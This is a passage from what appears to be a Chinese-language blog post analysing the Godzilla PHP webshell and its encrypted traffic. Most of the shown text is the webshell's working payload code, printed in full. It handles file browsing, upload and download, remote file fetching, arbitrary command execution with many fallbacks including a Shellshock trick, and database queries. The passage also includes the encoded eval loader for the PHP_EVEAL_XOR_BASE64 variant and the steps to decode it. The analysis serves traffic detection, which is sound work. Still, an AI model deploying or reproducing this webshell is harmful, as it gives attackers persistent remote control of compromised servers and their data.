($type!=null&amp;&amp;$attr!=null&amp;&amp;$fileName!=null) { if ($type=="fileBasicAttr"){ if (@chmod($fileName,convertFilePermissions($attr))){ return "ok"; }else{ return "fail"; } }else if ($type=="fileTimeAttr"){ if (@touch($fileName,$attr)){ return "ok"; }else{ return "fail"; } }else{ return "no ExcuteType"; } }else{ $ret="type or attr or fileName is null"; } return $ret; } function fileRemoteDown(){ $url=get("url"); $saveFile=get("saveFile"); if ($url!=null&amp;&amp;$saveFile!=null) { $data=@file_get_contents($url); if ($data!==false){ if (@file_put_contents($saveFile,$data)!==false){ @chmod($saveFile,0777); return "ok"; }else{ return "write fail"; } }else{ return "read fail"; } }else{ return "url or saveFile is null"; } } function copyFile(){ $srcFileName=get("srcFileName"); $destFileName=get("destFileName"); if (@is_file($srcFileName)){ if (copy($srcFileName,$destFileName)){ return "ok"; }else{ return "fail"; } }else{ return "The target does not exist or is not a file"; } } function moveFile(){ $srcFileName=get("srcFileName"); $destFileName=get("destFileName"); if (rename($srcFileName,$destFileName)){ return "ok"; }else{ return "fail"; } } function getBasicsInfo() { $data = array(); $data['OsInfo'] = @php_uname(); $data['CurrentUser'] = @get_current_user(); $data['CurrentUser'] = strlen(trim($data['CurrentUser'])) &gt; 0 ? $data['CurrentUser'] : 'NULL'; $data['REMOTE_ADDR'] = @$_SERVER['REMOTE_ADDR']; $data['REMOTE_PORT'] = @$_SERVER['REMOTE_PORT']; $data['HTTP_X_FORWARDED_FOR'] = @$_SERVER['HTTP_X_FORWARDED_FOR']; $data['HTTP_CLIENT_IP'] = @$_SERVER['HTTP_CLIENT_IP']; $data['SERVER_ADDR'] = @$_SERVER['SERVER_ADDR']; $data['SERVER_NAME'] = @$_SERVER['SERVER_NAME']; $data['SERVER_PORT'] = @$_SERVER['SERVER_PORT']; $data['disable_functions'] = @ini_get('disable_functions'); $data['disable_functions'] = strlen(trim($data['disable_functions'])) &gt; 0 ? $data['disable_functions'] : @get_cfg_var('disable_functions'); $data['Open_basedir'] = @ini_get('open_basedir'); $data['timezone'] = @ini_get('date.timezone'); $data['encode'] = @ini_get('exif.encode_unicode'); $data['extension_dir'] = @ini_get('extension_dir'); $tmpDir=sys_get_temp_dir(); $separator=substr($tmpDir,strlen($tmpDir)-1,1); if ($separator!='\\'&amp;&amp;$separator!='/'){ $tmpDir=$tmpDir.'/'; } $data['systempdir'] = $tmpDir; $data['include_path'] = @ini_get('include_path'); $data['DOCUMENT_ROOT'] = $_SERVER['DOCUMENT_ROOT']; $data['PHP_SAPI'] = PHP_SAPI; $data['PHP_VERSION'] = PHP_VERSION; $data['PHP_INT_SIZE'] = PHP_INT_SIZE; $data['ProcessArch'] = PHP_INT_SIZE==8?"x64":"x86"; $data['PHP_OS'] = PHP_OS; $data['canCallGzipDecode'] = canCallGzipDecode(); $data['canCallGzipEncode'] = canCallGzipEncode(); $data['session_name'] = @ini_get("session.name"); $data['session_save_path'] = @ini_get("session.save_path"); $data['session_save_handler'] = @ini_get("session.save_handler"); $data['session_serialize_handler'] = @ini_get("session.serialize_handler"); $data['user_ini_filename'] = @ini_get("user_ini.filename"); $data['memory_limit'] = @ini_get('memory_limit'); $data['upload_max_filesize'] = @ini_get('upload_max_filesize'); $data['post_max_size'] = @ini_get('post_max_size'); $data['max_execution_time'] = @ini_get('max_execution_time'); $data['max_input_time'] = @ini_get('max_input_time'); $data['default_socket_timeout'] = @ini_get('default_socket_timeout'); $data['mygid'] = @getmygid(); $data['mypid'] = @getmypid(); $data['SERVER_SOFTWAREypid'] = @$_SERVER['SERVER_SOFTWARE']; $data['SERVER_PORT'] = @$_SERVER['SERVER_PORT']; $data['loaded_extensions'] = @implode(',', @get_loaded_extensions()); $data['short_open_tag'] = @get_cfg_var('short_open_tag'); $data['short_open_tag'] = @(int)$data['short_open_tag'] == 1 ? 'true' : 'false'; $data['asp_tags'] = @get_cfg_var('asp_tags'); $data['asp_tags'] = (int)$data['asp_tags'] == 1 ? 'true' : 'false'; $data['safe_mode'] = @get_cfg_var('safe_mode'); $data['safe_mode'] = (int)$data['safe_mode'] == 1 ? 'true' : 'false'; $data['CurrentDir'] = str_replace('\\', '/', @dirname($_SERVER['SCRIPT_FILENAME'])); if (strlen(trim($data['CurrentDir']))==0){ $data['CurrentDir'] = str_replace('\\', '/', @dirname(__FILE__)); } $SCRIPT_FILENAME=@dirname(__FILE__); $data['FileRoot'] = ''; if (substr($SCRIPT_FILENAME, 0, 1) != '/') { $drivers=array('C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'); foreach ($drivers as $L){ if (@is_dir("{$L}:/")){ $data['FileRoot'] .= "{$L}:/;";} } if (empty($data['FileRoot'])){ $data['FileRoot']=substr($SCRIPT_FILENAME,0,3); } }else{ $data['FileRoot'] .= "/"; } $result=""; foreach($data as $key=&gt;$value){ $result.=$key." : ".$value."\n"; } return $result; } function getFile(){ $dir=get('dirName'); $dir=(strlen(@trim($dir))&gt;0)?trim($dir):str_replace('\\','/',dirname(__FILE__)); $dir.="/"; $path=$dir; $allFiles = @scandir($path); $data=""; if ($allFiles!=null){ $data.="ok"; $data.="\n"; $data.=$path; $data.="\n"; foreach ($allFiles as $fileName) { if ($fileName!="."&amp;&amp;$fileName!=".."){ $fullPath = $path.$fileName; $lineData=array(); array_push($lineData,$fileName); array_push($lineData,@is_file($fullPath)?"1":"0"); array_push($lineData,date("Y-m-d H:i:s", @filemtime($fullPath))); array_push($lineData,@filesize($fullPath)); $fr=(@is_readable($fullPath)?"R":"").(@is_writable($fullPath)?"W":"").(@is_executable($fullPath)?"X":""); array_push($lineData,(strlen($fr)&gt;0?$fr:"F")); $data.=(implode("\t",$lineData)."\n"); } } }else{ return "Path Not Found Or No Permission!"; } return $data; } function readFileContent(){ $fileName=get("fileName"); if (@is_file($fileName)){ if (function_existsEx("is_readable")){ return file_get_contents($fileName); }else{ return "No Permission!"; } }else{ return "File Not Found"; } } function uploadFile(){ $fileName=get("fileName"); $fileValue=get("fileValue"); if (@file_put_contents($fileName,$fileValue)!==false){ @chmod($fileName,0777); return "ok"; }else{ return "fail"; } } function newDir(){ $dir=get("dirName"); if (@mkdir($dir,0777,true)!==false){ return "ok"; }else{ return "fail"; } } function newFile(){ $fileName=get("fileName"); if (@file_put_contents($fileName,"")!==false){ return "ok"; }else{ return "fail"; } } function function_existsEx($functionName){ $d=explode(",",@ini_get("disable_functions")); if(empty($d)){ $d=array(); }else{ $d=array_map('trim',array_map('strtolower',$d)); } return(function_exists($functionName)&amp;&amp;is_callable($functionName)&amp;&amp;!in_array($functionName,$d)); } function execCommand(){ @ob_start(); $cmdLine=get("cmdLine"); if(substr(__FILE__,0,1)=="/"){ @putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"); }else{ @putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;"); } $result=""; if (!function_existsEx("runshellshock")){ function runshellshock($d, $c) { if (substr($d, 0, 1) == "/" &amp;&amp; function_existsEx('putenv') &amp;&amp; (function_existsEx('error_log') || function_existsEx('mail'))) { if (strstr(readlink("/bin/sh"), "bash") != FALSE) { $tmp = tempnam(sys_get_temp_dir(), 'as'); putenv("PHP_LOL=() { x; }; $c &gt;$tmp 2&gt;&amp;1"); if (function_existsEx('error_log')) { error_log("a", 1); } else { mail("a@127.0.0.1", "", "", "-bv"); } } else { return False; } $output = @file_get_contents($tmp); @unlink($tmp); if ($output != "") { return $output; } } return False; }; } if(function_existsEx('system')){ @system($cmdLine,$ret); }elseif(function_existsEx('passthru')){ $result=@passthru($cmdLine,$ret); }elseif(function_existsEx('shell_exec')){ $result=@shell_exec($cmdLine); }elseif(function_existsEx('exec')){ @exec($cmdLine,$o,$ret); $result=join("\n",$o); }elseif(function_existsEx('popen')){ $fp=@popen($cmdLine,'r'); while(!@feof($fp)){ $result.=@fgets($fp,1024*1024); } @pclose($fp); }elseif(function_existsEx('proc_open')){ $p = @proc_open($cmdLine, array(1 =&gt; array('pipe', 'w'), 2 =&gt; array('pipe', 'w')), $io); while(!@feof($io[1])){ $result.=@fgets($io[1],1024*1024); } while(!@feof($io[2])){ $result.=@fgets($io[2],1024*1024); } @fclose($io[1]); @fclose($io[2]); @proc_close($p); }elseif(substr(__FILE__,0,1)!="/" &amp;&amp; @class_exists("COM")){ $w=new COM('WScript.shell'); $e=$w-&gt;exec($cmdLine); $so=$e-&gt;StdOut(); $result.=$so-&gt;ReadAll(); $se=$e-&gt;StdErr(); $result.=$se-&gt;ReadAll(); }elseif (function_existsEx("pcntl_fork")&amp;&amp;function_existsEx("pcntl_exec")){ $cmd="/bin/bash"; if (!file_exists($cmd)){ $cmd="/bin/sh"; } $commandFile=sys_get_temp_dir()."/".time().".log"; $resultFile=sys_get_temp_dir()."/".(time()+1).".log"; @file_put_contents($commandFile,$cmdLine); switch (pcntl_fork()) { case 0: $args = array("-c", "$cmdLine &gt; $resultFile"); pcntl_exec($cmd, $args); // the child will only reach this point on exec failure, // because execution shifts to the pcntl_exec()ed command exit(0); default: break; } if (!file_exists($resultFile)){ sleep(2); } $result=file_get_contents($resultFile); @unlink($commandFile); @unlink($resultFile); }elseif(($result=runshellshock(__FILE__, $cmdLine)!==false)) { }else{ return "none of proc_open/passthru/shell_exec/exec/exec/popen/COM/runshellshock/pcntl_exec is available"; } $result .= @ob_get_contents(); @ob_end_clean(); return $result; } function execSql(){ $dbType=get("dbType"); $dbHost=get("dbHost"); $dbPort=get("dbPort"); $username=get("dbUsername"); $password=get("dbPassword"); $execType=get("execType"); $execSql=get("execSql"); $charset=get("dbCharset"); $currentDb=get("currentDb"); function mysqli_exec($host,$port,$username,$password,$execType,$currentDb,$sql,$charset){ // 创建连接 $conn = new mysqli($host,$username,$password,"",$port); // Check connection if ($conn-&gt;connect_error) { return $conn-&gt;connect_error; } if (!empty($charset)){ $conn-&gt;set_charset($charset); } if (!empty($currentDb)){ $conn-&gt;select_db($currentDb); } $result = $conn-&gt;query($sql); if ($conn-&gt;error){ return $conn-&gt;error; } if ($execType=="update"){ return "Query OK, ".$conn-&gt;affected_rows." rows affected"; }else{ $data="ok\n"; while ($column = $result-&gt;fetch_field()){ $data.=base64_encode($column-&gt;name)."\t"; } $data.="\n"; if ($result-&gt;num_rows &gt; 0) { while($row = $result-&gt;fetch_assoc()) { foreach ($row as $value){ $data.=base64_encode($value)."\t"; } $data.="\n"; } } return $data; } } function mysql_exec($host, $port, $username, $password, $execType, $currentDb,$sql,$charset) { $con = @mysql_connect($host.":".$port, $username, $password); if (!$con) { return mysql_error(); } else { if (!empty($charset)){ mysql_set_charset($charset,$con); } if (!empty($currentDb)){ if (function_existsEx("mysql_selectdb")){ mysql_selectdb($currentDb,$con); }elseif (function_existsEx("mysql_select_db")){ mysql_select_db($currentDb,$con); } } $result = @mysql_query($sql); if (!$result) { return mysql_error(); } if ($execType == "update") { return "Query OK, ".mysql_affected_rows($con)." rows affected"; } else { $data = "ok\n"; for ($i = 0; $i &lt; mysql_num_fields($result); $i++) { $data.= base64_encode(mysql_field_name($result, $i))."\t"; } $data.= "\n"; $rowNum = mysql_num_rows($result); if ($rowNum &gt; 0) { while ($row = mysql_fetch_row($result)) { foreach($row as $value) { $data.= base64_encode($value)."\t"; } $data.= "\n"; } } } @mysql_close($con); return $data; } } function mysqliEx_exec($host, $port, $username, $password, $execType, $currentDb,$sql,$charset){ $port == "" ? $port = "3306" : $port; $T=@mysqli_connect($host,$username,$password,"",$port); if (!empty($charset)){ @mysqli_set_charset($charset); } if (!empty($currentDb)){ @mysqli_select_db($T,$currentDb); } $q=@mysqli_query($T,$sql); if(is_bool($q)){ return mysqli_error($T); }else{ if (mysqli_num_fields($q)&gt;0){ $i=0; $data = "ok\n"; while($col=@mysqli_fetch_field($q)){ $data.=base64_encode($col-&gt;name)."\t"; $i++; } $data.="\n"; while($rs=@mysqli_fetch_row($q)){ for($c=0;$c&lt;$i;$c++){ $data.=base64_encode(trim($rs[$c]))."\t"; } $data.="\n"; } return $data; }else{ return "Query OK, ".@mysqli_affected_rows($T)." rows affected"; } } } function pg_execEx($host, $port, $username, $password, $execType,$currentDb, $sql,$charset){ $port == "" ? $port = "5432" : $port; $arr=array( 'host'=&gt;$host, 'port'=&gt;$port, 'user'=&gt;$username, 'password'=&gt;$password ); if (!empty($currentDb)){ $arr["dbname"]=$currentDb; } $cs=''; foreach($arr as $k=&gt;$v) { if(empty($v)){ continue; } $cs .= "$k=$v "; } $T=@pg_connect($cs); if(!$T){ return @pg_last_error(); }else{ if (!empty($charset)){ @pg_set_client_encoding($T,$charset); } $q=@pg_query($T, $sql); if(!$q){ return @pg_last_error(); }else{ $n=@pg_num_fields($q); if($n===NULL){ return @pg_last_error(); }elseif($n===0){ return "Query OK, ".@pg_affected_rows($q)." rows affected"; }else{ $data = "ok\n"; for($i=0;$i&lt;$n;$i++){ $data.=base64_encode(@pg_field_name($q,$i))."\t"; } $data.= "\n"; while($row=@pg_fetch_row($q)){ for($i=0;$i&lt;$n;$i++){ $data.=base64_encode($row[$i]!==NULL?$row[$i]:"NULL")."\t"; } $data.= "\n"; } return $data; } } } } function sqlsrv_exec($host, $port, $username, $password, $execType, $currentDb,$sql){ $dbConfig=array("UID"=&gt; $username,"PWD"=&gt;$password); if (!empty($currentDb)){ $dbConfig["Database"]=$currentDb; } $T=@sqlsrv_connect($host,$dbConfig); $q=@sqlsrv_query($T,$sql,null); if($q!==false){ $i=0; $fm=@sqlsrv_field_metadata($q); if(empty($fm)){ $ar=@sqlsrv_rows_affected($q); return "Query OK, ".$ar." rows affected"; }else{ $data = "ok\n"; foreach($fm as $rs){ $data.=base64_encode($rs['Name'])."\t"; $i++; } $data.= "\n"; while($rs=@sqlsrv_fetch_array($q,SQLSRV_FETCH_NUMERIC)){ for($c=0;$c&lt;$i;$c++){ $data.=base64_encode(trim($rs[$c]))."\t"; } $data.= "\n"; } return $data; } }else{ $err=""; if(($e = sqlsrv_errors()) != null){ foreach($e as $v){ $err.=($e['message'])."\n"; } } return $err; } } function mssql_exec($host, $port, $username, $password, $execType,$currentDb, $sql){ $T=@mssql_connect($host,$username,$password); if (!empty($currentDb)){ @mssql_select_db($currentDb); } $q=@mssql_query($sql,$T); if(is_bool($q)){ return "Query OK, ".@mssql_rows_affected($T)." rows affected"; }else{ $data = "ok\n"; $i=0; while($rs=@mssql_fetch_field($q)){ $data.=base64_encode($rs-&gt;name)."\t"; $i++; } $data.="\n"; while($rs=@mssql_fetch_row($q)){ for($c=0;$c&lt;$i;$c++){ $data.=base64_encode(trim($rs[$c]))."\t"; } $data.="\n"; } @mssql_free_result($q); @mssql_close($T); return $data; } } function oci_exec($host, $port, $username, $password, $execType, $currentDb, $sql, $charset) { $chs = $charset ? $charset : "utf8"; $mod = 0; $H = @oci_connect($username, $password, $host, $chs, $mod); if (!$H) { $errObj=@oci_error(); return $errObj["message"]; } else { $q = @oci_parse($H, $sql); if (@oci_execute($q)) { $n = oci_num_fields($q); if ($n == 0) { return "Query OK, ".@oci_num_rows($q)." rows affected"; } else { $data = "ok\n"; for ($i = 1; $i &lt;= $n; $i++) { $data.= base64_encode(oci_field_name($q, $i))."\t"; } $data.= "\n"; while ($row = @oci_fetch_array($q, OCI_ASSOC + OCI_RETURN_NULLS)) { foreach($row as $item) { $data.= base64_encode($item !== null ? base64_encode($item) : ""). "\t"; } $data.= "\n"; } return $data; } } else { $e = @oci_error($q); if ($e) { return "ERROR://{$e['message']} in [{$e['sqltext']}] col:{$e['offset']}"; } else { return "false"; } } } } function ora_exec($host, $port, $username, $password, $execType, $currentDb, $sql, $charset) { $H = @ora_plogon("{$username}@{$host}", "{$password}"); if (!$H) { return "Login Failed!"; } else { $T = @ora_open($H); @ora_commitoff($H); $q = @ora_parse($T, "{$sql}"); $R = ora_exec($T); if ($R) { $n = ora_numcols($T); $data="ok\n"; for ($i = 0; $i &lt; $n; $i++) { $data.=base64_encode(Ora_ColumnName($T, $i))."\t"; } $data.="\n"; while (ora_fetch($T)) { for ($i = 0; $i &lt; $n; $i++) { $data.=base64_encode(trim(ora_getcolumn($T, $i)))."\t"; } $data.="\n"; } return $data; } else { return "false"; } } } function sqlite_exec($host, $port, $username, $password, $execType, $currentDb, $sql, $charset) { $dbh=new SQLite3($host); if(!$dbh){ return "ERROR://CONNECT ERROR".SQLite3::lastErrorMsg(); }else{ $stmt=$dbh-&gt;prepare($sql); if(!$stmt){ return "ERROR://".$dbh-&gt;lastErrorMsg(); } else { $result=$stmt-&gt;execute(); if(!$result){ return $dbh-&gt;lastErrorMsg(); }else{ $bool=True; $data="ok\n"; while($res=$result-&gt;fetchArray(SQLITE3_ASSOC)){ if($bool){ foreach($res as $key=&gt;$value){ $data.=base64_encode($key)."\t"; } $bool=False; $data.="\n"; } foreach($res as $key=&gt;$value){ $data.=base64_encode($value!==NULL?$value:"NULL")."\t"; } $data.="\n"; } if($bool){ if(!$result-&gt;numColumns()){ return "Query OK, ".$dbh-&gt;changes()." rows affected"; }else{ return "ERROR://Table is empty."; } }else{ return $data; } } } $dbh-&gt;close(); } } function pdoExec($databaseType,$host,$port,$username,$password,$execType,$currentDb,$sql){ $conn=null; if ($databaseType==="oracle"){ $databaseType="orcl"; } if (strpos($host,"=")!==false){ $conn = new PDO($host, $username, $password); }else if (!empty($currentDb)){ $conn = new PDO("{$databaseType}:host=$host;port={$port};dbname={$currentDb}", $username, $password); }else{ $conn = new PDO("{$databaseType}:host=$host;port={$port};", $username, $password); } $conn-&gt;setAttribute(3, 0); if ($execType=="update"){ $affectRows=$conn-&gt;exec($sql); if ($affectRows!==false){ return "Query OK, ".$conn-&gt;exec($sql)." rows affected"; }else{ return "Err-&gt;\n".implode(',',$conn-&gt;errorInfo()); } }else{ $data="ok\n"; $stm=$conn-&gt;prepare($sql); if ($stm-&gt;execute()){ $row=$stm-&gt;fetch(2); $_row="\n"; foreach (array_keys($row) as $key){ $data.=base64_encode($key)."\t"; $_row.=base64_encode($row[$key])."\t"; } $data.=$_row."\n"; while ($row=$stm-&gt;fetch(2)){ foreach (array_keys($row) as $key){ $data.=base64_encode($row[$key])."\t"; } $data.="\n"; } return $data; }else{ return "Err-&gt;\n".implode(',',$stm-&gt;errorInfo()); } } } if ($dbType=="mysql"&amp;&amp;(class_exists("mysqli")||function_existsEx("mysql_connect")||function_existsEx("mysqli_connect"))){ if (class_exists("mysqli")){ return mysqli_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); }elseif (function_existsEx("mysql_connect")){ return mysql_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); }else if (function_existsEx("mysqli_connect")){ return mysqliEx_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); } }elseif ($dbType=="postgresql"&amp;&amp;function_existsEx("pg_connect")){ if (function_existsEx("pg_connect")){ return pg_execEx($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); } }elseif ($dbType=="sqlserver"&amp;&amp;(function_existsEx("sqlsrv_connect")||function_existsEx("mssql_connect"))){ if (function_existsEx("sqlsrv_connect")){ return sqlsrv_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql); }elseif (function_existsEx("mssql_connect")){ return mssql_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql); } }elseif ($dbType=="oracle"&amp;&amp;(function_existsEx("oci_connect")||function_existsEx("ora_plogon"))){ if (function_existsEx("oci_connect")){ return oci_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); }else if (function_existsEx("ora_plogon")){ return oci_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); } }elseif ($dbType=="sqlite"&amp;&amp;class_exists("SQLite3")){ return sqlite_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); } if (extension_loaded("pdo")){ return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql); }else{ return "no extension"; } } function base64Encode($data){ return base64_encode($data); } function test(){ return "ok"; } function get($key){ global $parameters; if (isset($parameters[$key])){ return $parameters[$key]; }else{ return null; } } function getAllParameters(){ global $parameters; return $parameters; } function includeCode(){ $classCode=get("binCode"); $codeName=get("codeName"); $_SES=&amp;getSession(); $_SES[$codeName]=$classCode; return "ok"; } function base64Decode($string){ return base64_decode($string); } function convertFilePermissions($fileAttr){ $mod=0; if (strpos($fileAttr,'R')!==false){ $mod=$mod+0444; } if (strpos($fileAttr,'W')!==false){ $mod=$mod+0222; } if (strpos($fileAttr,'X')!==false){ $mod=$mod+0111; } return $mod; } function g_close(){ @session_start(); $_SES=&amp;getSession(); $_SES=null; if (@session_destroy()){ return "ok"; }else{ return "fail!"; } } function bigFileDownload(){ $mode=get("mode"); $fileName=get("fileName"); $readByteNum=get("readByteNum"); $position=get("position"); if ($mode=="fileSize"){ return @filesize($fileName).""; }elseif ($mode=="read"){ if (function_existsEx("fopen")&amp;&amp;function_existsEx("fread")&amp;&amp;function_existsEx("fseek")){ $handle=fopen($fileName,"rb"); if ($handle!==false){ @fseek($handle,$position); $data=fread($handle,$readByteNum); @fclose($handle); if ($data!==false){ return $data; }else{ return "cannot read file"; } }else{ return "cannot open file"; } }else if (function_existsEx("file_get_contents")){ return file_get_contents($fileName,false,null,$position,$readByteNum); }else{ return "no function"; } }else{ return "no mode"; } } function bigFileUpload(){ $fileName=get("fileName"); $fileContents=get("fileContents"); $position=get("position"); if(function_existsEx("fopen")&amp;&amp;function_existsEx("fwrite")&amp;&amp;function_existsEx("fseek")){ $handle=fopen($fileName,"ab"); if ($handle!==false){ fseek($handle,$position); $len=fwrite($handle,$fileContents); @fclose($handle); if ($len!==false){ return "ok"; }else{ return "cannot write file"; } }else{ return "cannot open file"; } }else if (function_existsEx("file_put_contents")){ if (file_put_contents($fileName,$fileContents,FILE_APPEND)!==false){ return "ok"; }else{ return "writer fail"; } }else{ return "no function"; } } function canCallGzipEncode(){ if (function_existsEx("gzencode")){ return "1"; }else{ return "0"; } } function canCallGzipDecode(){ if (function_existsEx("gzdecode")){ return "1"; }else{ return "0"; } } function bytesToInteger($bytes, $position) { $val = 0; $val = $bytes[$position + 3] &amp; 0xff; $val &lt;&lt;= 8; $val |= $bytes[$position + 2] &amp; 0xff; $val &lt;&lt;= 8; $val |= $bytes[$position + 1] &amp; 0xff; $val &lt;&lt;= 8; $val |= $bytes[$position] &amp; 0xff; return $val; } function isGzipStream($bin){ if (strlen($bin)&gt;=2){ $bin=substr($bin,0,2); $strInfo = @unpack("C2chars", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); switch ($typeCode) { case 31139: return true; default: return false; } }else{ return false; } } function getBytes($string) { $bytes = array(); for($i = 0; $i &lt; strlen($string); $i++){ array_push($bytes,ord($string[$i])); } return $bytes; }</code></pre><p>内容包含了文件操作、执行命令等诸多模块，方便后续调用。</p><h3 id="PHP-EVEAL-XOR-BASE64"><a href="#PHP-EVEAL-XOR-BASE64" class="headerlink" title="PHP_EVEAL_XOR_BASE64"></a>PHP_EVEAL_XOR_BASE64</h3><p>这个shell脚本并无特别，一句话脚本上传即可。在流上与PHP_XOR_BASE64上的区别很明显，PHP_XOR_BASE64是key=加密，PHP_EVEAL_XOR_BASE64是pass=加密&amp;key=加密，那么我们需要考虑的部分在于pass后面跟了什么内容由流可得：</p><pre><code class="powershell">pass=eval%28base64_decode%28strrev%28urldecode%28%27url解码：pass=eval(base64_decode(strrev(urldecode('</code></pre><p>即是这段加密信息解密的方法：</p><pre><code class="powershell">K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD</code></pre><p>将加密url解密后：</p><pre><code class="powershell">K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD</code></pre><p>再将代码逆序排列：</p><pre><code>DQpAc2Vzc2lvbl9zdGFydCgpOw0KQHNldF90aW1lX2xpbWl0KDApOw0KQGVycm9yX3JlcG9ydGluZygwKTsNCmZ1bmN0aW9uIGVuY29kZSgkRCwkSyl7DQogICAgZm9yKCRpPTA7JGk8c3RybGVuKCREKTskaSsrKSB7DQogICAgICAgICRjID0gJEtbJGkrMSYxNV07DQogICAgICAgICREWyRpXSA9ICREWyRpXV4kYzsNCiAgICB9DQogICAgcmV0dXJuICREOw0KfQ0KJHBhc3M9J2tleSc7DQokcGF5bG9hZE5hbWU9J3BheWxvYWQnOw0KJGtleT0nM2M2ZTBiOGE5YzE1MjI0YSc7DQppZiAoaXNzZXQoJF9QT1NUWyRwYXNzXSkpew0KICAgICRkYXRhPWVuY29kZShiYXNlNjRfZGVjb2RlKCRfUE9TVFskcGFzc10pLCRrZXkpOw0KICAgIGlmIChpc3NldCgkX1NFU1NJT05bJHBheWxvYWROYW1lXSkpew0KICAgICAgICAkcGF5bG9hZD1lbmNvZGUoJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV0sJGtleSk7DQogICAgICAgIGlmIChzdHJwb3MoJHBheWxvYWQsImdldEJhc2ljc0luZm8iKT09PWZhbHNlKXsNCiAgICAgICAgICAgICRwYXlsb2FkPWVuY29kZSgkcGF5bG9hZCwka2V5KTsNCiAgICAgICAgfQ0KCQlldmFsKCRwYXlsb2FkKTsNCiAgICAgICAgZWNobyBzdWJzdHIobWQ1KCRwYXNzLiRrZXkpLDAsMTYpOw0KICAgICAgICBlY2hvIGJhc2U2NF9lbmNvZGUoZW5jb2RlKEBydW4oJGRhdGEpLCRrZXkpKTsNCi